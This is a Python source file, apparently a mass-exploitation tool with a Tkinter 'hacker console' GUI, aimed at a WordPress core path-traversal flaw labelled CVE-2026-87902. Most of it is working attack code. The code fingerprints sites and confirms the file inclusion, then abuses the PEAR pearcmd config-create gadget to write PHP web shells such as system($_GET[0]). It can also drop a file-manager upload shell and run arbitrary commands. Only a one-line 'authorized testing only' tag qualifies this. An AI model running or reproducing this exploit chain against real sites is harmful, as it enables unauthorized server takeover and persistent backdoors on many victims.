#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2026-87902  //  WORDPRESS CORE LFI -> RCE
GHSA-7hp8-65ch-5whp | CVSS 9.8 | CWE-22 | Affected: WP 4.7.0 - 7.1.1

Dark-neon Tkinter GUI (stdlib only) pada logika framework
MRdark-ops/CVE-2026-87902.  AUTHORIZED TESTING ONLY.
"""

import gzip, os, queue, random, re, secrets, socket, ssl, sys, threading, time
import urllib.error, urllib.parse, urllib.request, zlib
from concurrent.futures import ThreadPoolExecutor
from http.client import HTTPException

import tkinter as tk
import tkinter.font as tkfont
from tkinter import filedialog, messagebox, ttk

# ══════════════════════════════════════════════════════════════════════════
#  PALETTE  //  "hacker console"
# ══════════════════════════════════════════════════════════════════════════
BG      = "#07090d"   # latar utama
BG2     = "#0d1117"   # panel / input
BG3     = "#11161f"   # hover / header tab
BORDER  = "#1b2a3a"
NEON    = "#00ff9c"   # hijau neon
CYAN    = "#00d9ff"
MAGENTA = "#ff2e88"
AMBER   = "#ffb300"
TEXT    = "#c9d1d9"
DIM     = "#5b6b7c"
DIMMER  = "#33404f"

MONO_CANDIDATES = ("JetBrains Mono", "Cascadia Mono", "Cascadia Code",
                   "Fira Code", "Consolas", "DejaVu Sans Mono", "Courier New")

BANNER = r"""
 ██╗  ██╗██╗    ██╗██████╗
 ╚██╗██╔╝██║    ██║██╔══██╗
  ╚███╔╝ ██║ █╗ ██║██████╔╝
  ██╔██╗ ██║███╗██║██╔═══╝
 ██╔╝ ██╗╚███╔███╔╝██║
 ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝
""".strip("\n")

# ══════════════════════════════════════════════════════════════════════════
#  CONSTANTS  (identik dgn core/constants.py repo)
# ══════════════════════════════════════════════════════════════════════════
CVE, GHSA = "CVE-2026-87902", "GHSA-7hp8-65ch-5whp"
LAST_AFFECTED, DEPTH_TO_ROOT = (7, 1, 1), 4

FIXED = {
    (4, 7): 37, (4, 8): 32, (4, 9): 33, (5, 0): 29, (5, 1): 26, (5, 2): 28, (5, 3): 25,
    (5, 4): 23, (5, 5): 22, (5, 6): 21, (5, 7): 19, (5, 8): 17, (5, 9): 18, (6, 0): 16,
    (6, 1): 14, (6, 2): 13, (6, 3): 12, (6, 4): 12, (6, 5): 12, (6, 6): 9, (6, 7): 9,
    (6, 8): 10, (6, 9): 9, (7, 0): 6, (7, 1): 2,
}

GENERATOR    = re.compile(r"<meta[^>]+name=['\"]generator['\"][^>]+content=['\"]WordPress ([^'\"]+)['\"]", re.I)
CORE_VERSION = re.compile(r"/wp-includes/[^\"']+\?ver=(\d+\.\d+(?:\.\d+)?)")
THEME_HREF   = re.compile(r"/wp-content/themes/([A-Za-z0-9][A-Za-z0-9_.-]*)/")
STYLESHEET   = re.compile(r"/wp-content/themes/([A-Za-z0-9][A-Za-z0-9_.-]*)/style\.css")
WP_HINT      = re.compile(r"/wp-content/|/wp-includes/|wp-json|<meta[^>]+WordPress|rest_route=", re.I)
OPML_PRIMARY = re.compile(r'<opml\s+version=', re.I)
OPML_STRUCT  = (re.compile(r'</opml>', re.I), re.compile(r'<outline\b', re.I), re.compile(r'<dateCreated>', re.I))

CORE_ELSEWHERE = (
    ("/?feed=rss2", re.compile(r"wordpress\.org/\?v=(\d+\.\d+(?:\.\d+)?)", re.I)),
    ("/wp-links-opml.php", re.compile(r'generator="WordPress/(\d+\.\d+(?:\.\d+)?)"', re.I)),
)

PAGE_ID_BODY = re.compile(r"\bpage-id-(\d+)\b")
SHORTLINK    = re.compile(r"rel=['\"]shortlink['\"][^>]*href=['\"][^'\"]*[?&]p=(\d+)", re.I)
CANONICAL_ID = re.compile(r"rel=['\"]canonical['\"][^>]*href=['\"][^'\"]*[?&]page_id=(\d+)", re.I)
ANY_PAGE_ID  = re.compile(r"[?&]page_id=(\d+)")
BODY_CLASS   = re.compile(r"<body[^>]*\bclass=['\"]([^'\"]*)", re.I)
REST_IDS     = re.compile(r'"id"\s*:\s*([0-9]+)')

REST_ROUTES = (
    "/?rest_route=/wp/v2/pages&per_page=100&_fields=id,slug,link,template",
    "/index.php?rest_route=/wp/v2/pages&per_page=100&_fields=id,slug,link,template",
    "/wp-json/wp/v2/pages?per_page=100&_fields=id,slug,link,template",
)
SITEMAPS = ("/wp-sitemap.xml", "/wp-sitemap-posts-page-1.xml", "/?sitemap=posts&sitemap-subtype=page",
            "/page-sitemap.xml", "/sitemap_index.xml", "/sitemap.xml")

GADGETS_PEAR = [
    "/usr/local/lib/php/pearcmd", "/usr/share/php/pearcmd", "/usr/share/php/pear/pearcmd",
    "/usr/lib/php/pearcmd", "/usr/local/share/pear/pearcmd", "/usr/share/pear/pearcmd",
    "/opt/local/lib/php/pearcmd", "/usr/local/lib/php/PEAR/Command",
    "C:/xampp/php/PEAR/pearcmd", "C:/php/php/PEAR/pearcmd", "/xampp/php/PEAR/pearcmd",
    "/usr/lib/php/20190902/pearcmd",
]

DEFAULT_SEGMENTS = ["templates", "templates/page-templates", "page-templates"]
DEFAULT_DEPTHS   = [4, 3, 5, 6, 7]
DEFAULT_ORACLE   = "wp-links-opml"
DEFAULT_PIDS     = [2, 3, 4, 5, 7, 10]
USER_AGENT       = "Mozilla/5.0 (compatible; CVE-2026-87902-mass/3.0)"
MARCA, MARCA_FIN = "___WP_RCE_OK___", "___WP_RCE_END___"
RUTAS_SALIDA     = ["/tmp/wp-cve-87902", "/tmp/wp87902", "/tmp/pear-rce"]

FILE_MANAGER = r'''<?php
error_reporting(0);
$d=__DIR__;
echo "<h1>File Manager</h1><p>Dir: ".htmlspecialchars(realpath($d))."</p>";
if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_FILES['file'])){
    if(move_uploaded_file($_FILES['file']['tmp_name'],$d.'/'.basename($_FILES['file']['name'])))
        echo "OK: ".htmlspecialchars(basename($_FILES['file']['name']));
    else echo "FAIL";
}
$out='';
foreach(scandir($d) as $f){ if($f!='.'&&$f!='..'){ $p="$d/$f";
    $sz=is_file($p)?filesize($p):0; $out.="<tr><td>".htmlspecialchars($f)."</td><td>$sz B</td></tr>"; } }
echo "<form method=POST enctype=multipart/form-data><input type=file name=file><button>Upload</button></form>";
echo "<table border=1>$out</table>";
?>
'''

# ══════════════════════════════════════════════════════════════════════════
#  BACKEND HELPERS
# ══════════════════════════════════════════════════════════════════════════
def double(raw):
    return raw.replace(".", "%252e").replace("/", "%252f")

def build_pagename(segment, depth, target):
    return double(segment) + "%252f" + ("%252e%252e%252f" * depth) + double(target)

def build_payload(root, include, depth):
    target = include[:-4] if include.endswith(".php") else include
    climb = ("../" * depth + target.lstrip("/")) if target.startswith("/") else ("../" * DEPTH_TO_ROOT + target)
    return root + "/" + climb

def parse_version(v):
    p = v.split(".")
    try:
        maj, mnr = int(p[0]), int(p[1])
    except (IndexError, ValueError):
        return None
    patch = None
    if len(p) >= 3:
        try: patch = int(p[2])
        except ValueError: patch = None
    return (maj, mnr, patch)

def version_verdict(v):
    pv = parse_version(v)
    if not pv: return ("unknown_patch", "unparseable %r" % v)
    maj, mnr, patch = pv
    if (maj, mnr, patch or 0) < (4, 7, 0): return ("out_of_range", "%s predates vulnerable code" % v)
    if (maj, mnr) in FIXED:
        fix = FIXED[(maj, mnr)]
        if patch is None: return ("unknown_patch", "branch %d.%d fixed at .%d" % (maj, mnr, fix))
        if patch < fix:   return ("vulnerable_range", "%s < %d.%d.%d" % (v, maj, mnr, fix))
        return ("patched", "%s >= %d.%d.%d" % (v, maj, mnr, fix))
    if (maj, mnr) > (7, 1): return ("out_of_range", "%s released after fix" % v)
    if (4, 7) <= (maj, mnr) <= (7, 1): return ("vulnerable_range", "%s in affected range" % v)
    return ("out_of_range", "%s outside range" % v)

def normalize(url):
    url = (url or "").strip()
    if not url or url.startswith("#"): return None
    if not re.match(r'^https?://', url, re.I): url = "http://" + url
    return url.rstrip("/")

def canonical_base(input_base, final_url):
    o, f = urllib.parse.urlsplit(input_base), urllib.parse.urlsplit(final_url or "")
    scheme = f.scheme or o.scheme or "http"
    netloc = f.netloc or o.netloc
    fpath, opath = f.path or "", o.path or ""
    path = fpath if fpath not in ("", "/") else opath
    return ("%s://%s%s" % (scheme, netloc, path)).rstrip("/")

# ══════════════════════════════════════════════════════════════════════════
#  HTTP CLIENT
# ══════════════════════════════════════════════════════════════════════════
class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k): return None

def _decompress(raw, hdrs):
    enc = (hdrs.get("content-encoding") or "").lower()
    try:
        if "gzip" in enc: return gzip.decompress(raw)
        if "deflate" in enc:
            try: return zlib.decompress(raw)
            except zlib.error: return zlib.decompress(raw, -zlib.MAX_WBITS)
    except Exception:
        return raw
    return raw

class HTTPClient:
    def __init__(self, insecure=True, proxy=None):
        ctx = ssl.create_default_context()
        if insecure:
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        https = urllib.request.HTTPSHandler(context=ctx)
        hf, hn = [https], [https, _NoRedirect()]
        if proxy:
            p = urllib.request.ProxyHandler({"http": proxy, "https": proxy})
            hf.append(p); hn.append(p)
        self.opener = urllib.request.build_opener(*hf)
        self.noredir = urllib.request.build_opener(*hn)

    def request(self, opener, method, url, headers, timeout, data=None, max_bytes=524288):
        try:
            req = urllib.request.Request(url=url, data=data, method=method)
        except ValueError as e:
            return -1, url, {}, "transport-error: %s" % e
        for k, v in headers.items(): req.add_header(k, v)
        try:
            r = opener.open(req, timeout=timeout)
            raw = _decompress(r.read(max_bytes), {k.lower(): v for k, v in r.headers.items()})
            try: charset = r.headers.get_content_charset() or "utf-8"
            except Exception: charset = "utf-8"
            try: body = raw.decode(charset, "replace")
            except (LookupError, TypeError): body = raw.decode("utf-8", "replace")
            return r.getcode(), r.geturl(), dict(r.headers), body
        except urllib.error.HTTPError as e:
            raw = b""
            try: raw = e.read(max_bytes)
            except Exception: pass
            hdrs = {}
            try: hdrs = {k.lower(): v for k, v in e.headers.items()}
            except Exception: pass
            return e.code, url, hdrs, _decompress(raw, hdrs).decode("utf-8", "replace")
        except (urllib.error.URLError, socket.timeout, ssl.SSLError,
                ConnectionError, HTTPException, LookupError, OSError) as e:
            return -1, url, {}, "transport-error: %s" % getattr(e, "reason", e)

    def get(self, url, headers, timeout, follow=True):
        return self.request(self.opener if follow else self.noredir, "GET", url, headers, timeout)

    def post(self, url, headers, timeout, data=None, follow=True):
        return self.request(self.opener if follow else self.noredir, "POST", url, headers, timeout, data=data)

# ══════════════════════════════════════════════════════════════════════════
#  EXPLOIT MODULES
# ══════════════════════════════════════════════════════════════════════════
class Fingerprinter:
    def __init__(self, http, headers, timeout, emit):
        self.http, self.headers, self.timeout, self.emit = http, headers, timeout, emit

    def _version_from(self, body):
        for rx in (GENERATOR, CORE_VERSION):
            m = rx.search(body or "")
            if m: return m.group(1)
        return None

    def fingerprint(self, base, home_body=None):
        body = home_body or self.http.get(base + "/", self.headers, self.timeout)[3] or ""
        is_wp = bool(WP_HINT.search(body))
        version = self._version_from(body)
        if not version:
            for path, rx in CORE_ELSEWHERE:
                st, _, _, b = self.http.get(base + path, self.headers, self.timeout)
                if st == 200:
                    m = rx.search(b or "")
                    if m: version = m.group(1); is_wp = True; break
        theme = None
        m = STYLESHEET.search(body) or THEME_HREF.search(body)
        if m: theme = m.group(1)
        verdict, note = version_verdict(version) if version else ("unknown", "version not determined")
        return {"is_wordpress": is_wp or bool(version), "wordpress": version, "theme": theme,
                "version_verdict": verdict, "version_note": note, "body": body}

class PreconditionChecker:
    def __init__(self, http, headers, timeout, emit):
        self.http, self.headers, self.timeout, self.emit = http, headers, timeout, emit

    def check_theme_dir(self, base, theme):
        if not theme: return {"directory": None}
        for cand in DEFAULT_SEGMENTS:
            for path in ("/wp-content/themes/%s/%s/" % (theme, cand),
                         "/wp-content/themes/%s/%s" % (theme, cand)):
                st, _, _, b = self.http.get(base + path, self.headers, self.timeout)
                if st == 200 and "index of" not in (b or "").lower():
                    return {"directory": cand, "status": st}
        return {"directory": None}

class PageDiscoverer:
    def __init__(self, http, headers, timeout, emit, probe=12):
        self.http, self.headers, self.timeout, self.emit, self.probe = http, headers, timeout, emit, probe

    def discover(self, base, home=""):
        found, seen = [], set()
        def add(i):
            try: i = int(i)
            except (TypeError, ValueError): return
            if i > 0 and i not in seen:
                seen.add(i); found.append({"id": i})
        for route in REST_ROUTES:
            st, _, _, b = self.http.get(base + route, self.headers, self.timeout)
            if st == 200 and b:
                for i in REST_IDS.findall(b): add(i)
        for sm in SITEMAPS:
            st, _, _, b = self.http.get(base + sm, self.headers, self.timeout)
            if st == 200 and b:
                for loc in re.findall(r"<loc>\s*([^<\s]+)\s*</loc>", b, re.I):
                    for i in ANY_PAGE_ID.findall(loc): add(i)
        for rx in (PAGE_ID_BODY, ANY_PAGE_ID, SHORTLINK, CANONICAL_ID):
            for i in rx.findall(home or ""): add(i)
        m = BODY_CLASS.search(home or "")
        if m:
            for i in PAGE_ID_BODY.findall(m.group(1)): add(i)
        if not found:
            for i in DEFAULT_PIDS: add(i)
        return found[:self.probe]

class TraversalExploiter:
    def __init__(self, http, headers, timeout, emit, max_time=60.0):
        self.http, self.headers, self.timeout, self.emit, self.max_time = http, headers, timeout, emit, max_time

    def _opml_hit(self, status, body):
        if not (status == 200 and OPML_PRIMARY.search(body or "")): return False, []
        marks = ["<opml version="]
        for rx in OPML_STRUCT:
            if rx.search(body): marks.append(rx.pattern)
        return (len(marks) >= 2), marks

    def exploit(self, base, page_ids, segments, depths, oracle_file=DEFAULT_ORACLE):
        t0 = time.monotonic()
        def left(): return self.max_time - (time.monotonic() - t0)

        def probe(pid, method, seg, depth, tgt):
            url = base + "/?page_id=%d&pagename=%s" % (pid, build_pagename(seg, depth, tgt))
            if method == "POST":
                r = self.http.post(url, self.headers, self.timeout, data=b"", follow=False)
            else:
                r = self.http.get(url, self.headers, self.timeout, follow=False)
            return r[0], r[3], url

        extra = [oracle_file, "wp/" + oracle_file, "wordpress/" + oracle_file]
        plan = [(page_ids[:1], segments, [oracle_file]), (page_ids[:4], segments, extra)]
        tried, seen = 0, set()
        for pids, segs, targets in plan:
            for pid in pids:
                for method in ("POST", "GET"):
                    for seg in segs:
                        for depth in depths:
                            for tgt in targets:
                                key = (pid, method, seg, depth, tgt)
                                if key in seen or left() <= 0: continue
                                seen.add(key)
                                st, body, url = probe(pid, method, seg, depth, tgt)
                                tried += 1
                                hit, marks = self._opml_hit(st, body)
                                if hit:
                                    nx = tgt + "-nx%d" % (int(time.time() * 1000) % 100000)
                                    st2, b2, _ = probe(pid, method, seg, depth, nx)
                                    if self._opml_hit(st2, b2)[0]:
                                        self.emit("warn", "    oracle ambient (false positive), skip")
                                        continue
                                    return {"fired": True, "method": method, "page_id": pid, "segment": seg,
                                            "depth": depth, "oracle_file": tgt, "http_status": st,
                                            "resp_len": len(body), "markers": marks, "request": url}
        return {"fired": False, "requests_tried": tried, "timed_out": left() <= 0}

class RCEEscalator:
    EXTRA_DEPTHS = list(range(1, 20))
    def __init__(self, http, headers, timeout, emit):
        self.http, self.headers, self.timeout, self.emit = http, headers, timeout, emit

    def _differs(self, cur, base):
        if base == 0 and cur > 200: return True
        if cur == 0 and base > 200: return True
        return abs(cur - base) > max(600, 0.30 * max(cur, base))

    def escalate(self, base, page_id, root, depths, command="id", drop="/tmp",
                 shell_file=None, deploy_shell=False):
        res = {"rce": False, "shell_deployed": False, "shell_url": "", "gadget": "",
               "prof": 0, "payload": "", "salida": "", "command": command, "ran": "", "detail": ""}
        _, _, _, bbody = self.http.post(base + "/", self.headers, self.timeout,
                                        data=("page_id=%d" % page_id).encode(), follow=False)
        baseline = len(bbody or "")
        all_depths = list(dict.fromkeys(self.EXTRA_DEPTHS + list(depths)))

        # ── PHASE 1 : gadget discovery
        self.emit("stage", "    [P1] probing PEAR gadget...")
        gadget, prof = None, None
        for depth in all_depths:
            for pear in GADGETS_PEAR:
                pn = double(build_payload(root, pear, depth))
                _, _, _, b = self.http.post(base + "/", self.headers, self.timeout,
                                            data=("page_id=%d&pagename=%s" % (page_id, pn)).encode(), follow=False)
                if self._differs(len(b or ""), baseline):
                    gadget, prof = pear, depth
                    self.emit("ok", "    [P1] gadget %s @ depth=%d" % (pear, depth))
                    break
            if gadget: break
        if not gadget:
            res["detail"] = "No PEAR gadget responded"; return res
        res["gadget"], res["prof"] = gadget, prof

        # ── PHASE 2 : File Manager deploy
        if deploy_shell:
            self.emit("stage", "    [P2] deploying File Manager...")
            r = self._deploy_filemanager(base, page_id, root, prof, gadget, drop)
            if r["success"]:
                res.update(shell_deployed=True, shell_url=r["url"], salida=r["path"],
                           payload="filemanager", detail="File Manager: %s" % r["url"])
                self.emit("ok", "    [P2] %s" % r["url"])
                return res
            self.emit("warn", "    [P2] gagal: %s" % r["detail"])

        # ── PHASE 3 : write PHP + execute command
        self.emit("stage", "    [P3] writing PHP via config-create...")
        payloads = [("system", "<?=system($_GET[0])?>"), ("passthru", "<?=passthru($_GET[0])?>"),
                    ("shell_exec", "<?=shell_exec($_GET[0])?>"), ("backtick", "<?=`$_GET[0]`?>")]
        written, used_out, used_payload = False, "", ""
        for name, code in payloads:
            for out in RUTAS_SALIDA:
                args = "config-create+/%s+%s.php" % (code, out)
                pn = double(build_payload(root, gadget, prof))
                _, _, _, b = self.http.post(base + "/?" + args, self.headers, self.timeout,
                                            data=("page_id=%d&pagename=%s" % (page_id, pn)).encode(), follow=False)
                if b and "CONFIGURATION" in b:
                    written, used_out, used_payload = True, out, name; break
            if written: break
        if not written:
            res["detail"] = "config-create failed"; return res
        res["payload"], res["salida"] = used_payload, used_out
        self.emit("ok", "    [P3] written %s.php (%s)" % (used_out, used_payload))

        for depth in all_depths:
            pn = double(build_payload(root, "%s.php" % used_out, depth))
            url = base + "/?" + urllib.parse.urlencode({"0": "echo %s; %s; echo %s" % (MARCA, command, MARCA_FIN)})
            _, _, _, b = self.http.post(url, self.headers, self.timeout,
                                        data=("page_id=%d&pagename=%s" % (page_id, pn)).encode(), follow=False)
            if b and MARCA in b:
                s = b.find(MARCA) + len(MARCA); e = b.find(MARCA_FIN, s)
                out = b[s:e].strip() if e > s else b[s:s + 500].strip()
                res.update(rce=True, ran=out, detail="%s: %s" % (command, out[:80]))
                return res
        res["detail"] = "Shell tertulis tapi eksekusi gagal"; return res

    def _deploy_filemanager(self, base, page_id, root, depth, gadget, drop):
        r = {"success": False, "url": "", "path": "", "detail": ""}
        name = "fm_" + secrets.token_hex(4) + ".php"
        path = "%s/%s" % (drop.rstrip("/"), name)
        fm = "<?=%s?>" % FILE_MANAGER
        args = "config-create+/%s+%s" % (fm, path)
        pn = double(build_payload(root, gadget, depth))
        _, _, _, b = self.http.post(base + "/?" + args, self.headers, self.timeout,
                                    data=("page_id=%d&pagename=%s" % (page_id, pn)).encode(), follow=False)
        if not (b and "CONFIGURATION" in b):
            r["detail"] = "config-create ditolak"; return r
        for td in range(1, 20):
            pn = double(build_payload(root, path.lstrip("/"), td))
            _, _, _, b = self.http.post(base + "/", self.headers, self.timeout,
                                        data=("page_id=%d&pagename=%s" % (page_id, pn)).encode(), follow=False)
            if b and ("File Manager" in b or "fm_" in b):
                r.update(success=True, url="%s/?page_id=%d&pagename=%s" % (base, page_id, pn),
                         path=path, detail="deployed at %s" % path)
                return r
        r["detail"] = "File Manager tertulis tapi tak terverifikasi"; return r

# ══════════════════════════════════════════════════════════════════════════
#  WORKER
# ══════════════════════════════════════════════════════════════════════════
class TargetWorker:
    def __init__(self, opts, emit):
        self.o, self.emit = opts, emit
        self.http = HTTPClient(insecure=not opts["verify_ssl"], proxy=opts["proxy"] or None)
        self.headers = {"User-Agent": USER_AGENT, "Accept": "*/*",
                        "Accept-Encoding": "identity", "Connection": "close"}

    def process(self, target):
        out = {"target": target, "verdict": "ERROR", "version": "", "lfi": "", "rce": "", "shell": "", "detail": ""}
        base = normalize(target)
        if not base:
            out["detail"] = "target kosong"; return out
        st, final, _, body = self.http.get(base + "/", self.headers, self.o["timeout"])
        if st < 0:
            out["detail"] = body; return out
        base = canonical_base(base, final); out["base"] = base
        self.emit("dim", "  probe %s" % base)

        fp = Fingerprinter(self.http, self.headers, self.o["timeout"], self.emit).fingerprint(base, home_body=body)
        out["version"] = fp["wordpress"] or "?"
        self.emit("dim", "  WP=%s theme=%s verdict=%s" % (out["version"], fp["theme"], fp["version_verdict"]))
        if not fp["is_wordpress"] and not fp["wordpress"]:
            out["verdict"] = "NOT_WORDPRESS"; out["detail"] = "tanpa indikator WP"; return out
        if fp["version_verdict"] in ("patched", "out_of_range"):
            out["verdict"] = "NOT_VULNERABLE"; out["detail"] = fp["version_note"]; return out

        directory = None
        pc = PreconditionChecker(self.http, self.headers, self.o["timeout"], self.emit)
        for c in ([fp["theme"]] if fp["theme"] else []):
            d = pc.check_theme_dir(base, c)
            if d["directory"]:
                directory = d["directory"]; break
        segments = list(dict.fromkeys(([directory] if directory else []) + self.o["segments"]))
        self.emit("dim", "  segments=%s" % ",".join(segments))

        pages = PageDiscoverer(self.http, self.headers, self.o["timeout"], self.emit,
                               self.o["probe"]).discover(base, home=body)
        if not pages:
            out["verdict"] = "POSSIBLY_VULNERABLE"; out["detail"] = "tak ada page_id"; return out
        ids = [p["id"] for p in pages[:4]]
        self.emit("dim", "  page_ids=%s" % ids)

        oracle = TraversalExploiter(self.http, self.headers, self.o["timeout"], self.emit,
                                    self.o["max_time"]).exploit(base, ids, segments, self.o["depths"], self.o["oracle"])
        if oracle.get("fired"):
            out["verdict"] = "VULNERABLE"
            out["lfi"] = "page-%s %s d=%d %s" % (oracle["segment"], "../" * oracle["depth"], oracle["depth"], oracle["method"])
            self.emit("vuln", "[VULN] %s | %s" % (base, out["lfi"]))
            if self.o["exploit"]:
                r = RCEEscalator(self.http, self.headers, self.o["timeout"], self.emit).escalate(
                    base, oracle["page_id"], oracle["segment"], self.o["depths"],
                    command=self.o["command"], drop=self.o["drop"],
                    shell_file=self.o["shell_file"], deploy_shell=self.o["shell"])
                if r["rce"]:
                    out["rce"] = r["ran"][:200]
                    self.emit("pwn", "[RCE ] %s | %s" % (base, r["ran"][:120].replace("\n", " ")))
                if r["shell_deployed"]:
                    out["shell"] = r["shell_url"]
                    self.emit("shell", "[SHLL] %s | %s" % (base, r["shell_url"]))
                out["detail"] = r["detail"]
            else:
                out["detail"] = "LFI confirmed (check-only)"
        else:
            out["verdict"] = "POSSIBLY_VULNERABLE"
            out["detail"] = "oracle OPML tak menyala (%d req)" % oracle.get("requests_tried", 0)
        return out

# ══════════════════════════════════════════════════════════════════════════
#  CUSTOM WIDGETS
# ══════════════════════════════════════════════════════════════════════════
class NeonButton(tk.Frame):
    """Tombol flat dengan border 1px + efek hover invert."""
    def __init__(self, parent, text, command, color=NEON, padx=14, pady=7, wide=False, **kw):
        super().__init__(parent, bg=BORDER, highlightthickness=0)
        self.color = color
        self.command = command
        self.enabled = True
        self.lbl = tk.Label(self, text=text, bg=BG2, fg=color, font=FONT_B,
                            padx=padx, pady=pady, cursor="hand2",
                            anchor="center" if not wide else "w")
        self.lbl.pack(fill="both", expand=True, padx=1, pady=1)
        for w in (self, self.lbl):
            w.bind("<Enter>", self._hover)
            w.bind("<Leave>", self._leave)
            w.bind("<Button-1>", self._press)
            w.bind("<ButtonRelease-1>", self._release)

    def _hover(self, _=None):
        if not self.enabled: return
        self.lbl.configure(bg=self.color, fg=BG)
        self.configure(bg=self.color)

    def _leave(self, _=None):
        if not self.enabled: return
        self.lbl.configure(bg=BG2, fg=self.color)
        self.configure(bg=BORDER)

    def _press(self, _=None):
        if not self.enabled: return
        self.lbl.configure(bg=self.color, fg=BG)

    def _release(self, _=None):
        if not self.enabled: return
        self._hover()
        if callable(self.command):
            self.command()

    def set_text(self, text):
        self.lbl.configure(text=text)

    def set_enabled(self, on, color=None):
        self.enabled = on
        c = color or self.color
        self.lbl.configure(fg=c if on else DIMMER, bg=BG2)
        self.configure(bg=BORDER if on else "#141a22")

class NeonCheck(tk.Checkbutton):
    def __init__(self, parent, text, variable, command=None, **kw):
        super().__init__(parent, text=text, variable=variable, bg=BG, fg=DIM, selectcolor=BG2,
                         activebackground=BG, activeforeground=NEON, font=FONT,
                         highlightthickness=0, bd=0, anchor="w", cursor="hand2", **kw)
        self._var = variable
        self._user_cmd = command
        self._sync()
        self.configure(command=self._on_toggle)

    def _on_toggle(self):
        self._sync()
        if callable(self._user_cmd):
            self._user_cmd()

    def _sync(self):
        self.configure(fg=NEON if self._var.get() else DIM)

    # kompatibilitas: biar tetap bisa dipanggil seperti Checkbutton biasa
    def get(self):
        return self._var.get()

    def set(self, value):
        self._var.set(value)
        self._sync()

class Field(tk.Frame):
    """Label kecil di atas + entry dengan border menyala saat fokus."""
    def __init__(self, parent, label, variable, width=18, placeholder=""):
        super().__init__(parent, bg=BG)
        self.var = variable
        tk.Label(self, text=label.upper(), bg=BG, fg=DIM, font=FONT_S).pack(anchor="w", pady=(0, 1))
        self.box = tk.Frame(self, bg=BORDER, padx=1, pady=1)
        self.box.pack(fill="x")
        self.entry = tk.Entry(self.box, textvariable=variable, bg=BG2, fg=TEXT,
                              insertbackground=NEON, relief="flat", font=FONT,
                              width=width, highlightthickness=0, bd=0, disabledbackground=BG2,
                              disabledforeground=DIMMER)
        self.entry.pack(fill="x", ipady=5, padx=1, pady=1)
        self.entry.bind("<FocusIn>", lambda e: self.box.configure(bg=NEON))
        self.entry.bind("<FocusOut>", lambda e: self.box.configure(bg=BORDER))

    def set_enabled(self, on):
        self.entry.configure(state="normal" if on else "disabled")
        self.box.configure(bg=BORDER)

class VScroll(tk.Frame):
    """Kolom konfigurasi yang bisa di-scroll vertikal."""
    def __init__(self, parent, width=452):
        super().__init__(parent, bg=BG, width=width)
        self.pack_propagate(False)

        self.canvas = tk.Canvas(self, bg=BG, highlightthickness=0, bd=0)
        self.sb = tk.Scrollbar(self, command=self.canvas.yview, bg=BG2, troughcolor=BG,
                               activebackground=NEON, relief="flat", bd=0, width=8)
        self.sb.pack(side="right", fill="y")
        self.canvas.pack(side="left", fill="both", expand=True)

        self.inner = tk.Frame(self.canvas, bg=BG)
        self._win = self.canvas.create_window((0, 0), window=self.inner, anchor="nw")

        self.inner.bind("<Configure>",
                        lambda e: self.canvas.configure(scrollregion=self.canvas.bbox("all")))
        self.canvas.bind("<Configure>",
                         lambda e: self.canvas.itemconfigure(self._win, width=e.width))
        self.canvas.configure(yscrollcommand=self.sb.set)

        # roda mouse hanya aktif saat kursor di atas kolom ini
        self.canvas.bind("<Enter>", self._wheel_on)
        self.canvas.bind("<Leave>", self._wheel_off)

    def _wheel_on(self, _=None):
        self.canvas.bind_all("<MouseWheel>", self._wheel)
        self.canvas.bind_all("<Button-4>", self._wheel)
        self.canvas.bind_all("<Button-5>", self._wheel)

    def _wheel_off(self, _=None):
        self.canvas.unbind_all("<MouseWheel>")
        self.canvas.unbind_all("<Button-4>")
        self.canvas.unbind_all("<Button-5>")

    def _wheel(self, e):
        if getattr(e, "num", None) == 4:      delta = -1     # Linux scroll up
        elif getattr(e, "num", None) == 5:    delta = 1      # Linux scroll down
        else:                                 delta = -1 if e.delta > 0 else 1
        self.canvas.yview_scroll(delta * 2, "units")
        
class MatrixStrip(tk.Canvas):
    """Rain animasi tipis sebagai dekorasi header."""
    CHARS = "abcdefghijklmnopqrstuvwxyz0123456789/\\|<>#$%&*+=~"
    def __init__(self, parent, height=26):
        super().__init__(parent, bg=BG, height=height, highlightthickness=0)
        self.running = True
        self.cols = []
        self.bind("<Configure>", self._reset)
        self.after(80, self._tick)

    def _reset(self, _=None):
        w = max(self.winfo_width(), 1)
        self.cols = [random.randint(-40, 0) for _ in range(max(1, w // 11))]

    def _tick(self):
        if not self.running:
            return
        try:
            self.delete("all")
            h = self.winfo_height() or 26
            for i, y in enumerate(self.cols):
                x = i * 11 + 4
                for k, shade in enumerate((NEON, "#00c47a", "#006e45")):
                    yy = y - k * 11
                    if 0 <= yy <= h:
                        self.create_text(x, yy, text=random.choice(self.CHARS),
                                         fill=shade, font=(FONT_FAMILY, 9))
                self.cols[i] = y + 11 if y < h + 40 else -random.randint(40, 400)
        except tk.TclError:
            return
        self.after(70, self._tick)

# ══════════════════════════════════════════════════════════════════════════
#  MAIN GUI
# ══════════════════════════════════════════════════════════════════════════
class HackerGUI:
    def __init__(self, root):
        self.root = root
        root.title("// XWP_RCE  ::  CVE-2026-87902")
        root.configure(bg=BG)
        root.geometry("1180x820")
        root.minsize(1040, 720)
        self.queue = queue.Queue()
        self.stop_flag = threading.Event()
        self.results = []
        self.stats = {"total": 0, "done": 0, "vuln": 0, "rce": 0, "shell": 0}
        self.pulse = 0
        self._build()
        root.bind("<Control-Return>", lambda e: self.start())
        root.bind("<Escape>", lambda e: self.stop_flag.set())
        self._drain()
        self._pulse()

    # ─────────────────────────── BUILD ───────────────────────────
    def _build(self):
        self._header()
        self.matrix = MatrixStrip(self.root)
        self.matrix.pack(fill="x", padx=0, pady=(0, 4))

        body = tk.Frame(self.root, bg=BG)
        body.pack(fill="both", expand=True, padx=10, pady=(0, 6))

        self.leftwrap = VScroll(body, width=452)
        self.leftwrap.pack(side="left", fill="y", padx=(0, 10))
        self.left = self.leftwrap.inner

        self.right = tk.Frame(body, bg=BG)
        self.right.pack(side="left", fill="both", expand=True)

        self._config_panel(self.left)
        self._results_panel(self.right)
        self._statusbar()

    def _header(self):
        h = tk.Frame(self.root, bg=BG)
        h.pack(fill="x", padx=10, pady=(8, 2))
        tk.Label(h, text=BANNER, bg=BG, fg=NEON, font=(FONT_FAMILY, 10, "bold"),
                 justify="left").pack(side="left")
        info = tk.Frame(h, bg=BG)
        info.pack(side="left", padx=22, anchor="n")
